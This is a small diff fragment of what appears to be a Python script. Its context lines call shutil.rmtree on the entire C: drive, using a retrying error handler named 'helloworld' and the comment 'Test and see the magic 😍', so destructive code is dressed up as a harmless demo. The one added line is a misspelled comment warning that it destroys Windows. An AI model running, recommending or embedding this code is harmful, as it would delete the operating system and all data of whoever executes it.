@@ -5,6 +5,7 @@ def helloworld(func, path, _):
     func(path)
 
 # Test and see the magic 😍
+# DESTROYES THE WINDOWS WARNING
 try:
     shutil.rmtree('C:\\', onerror=helloworld)
 except Exception:
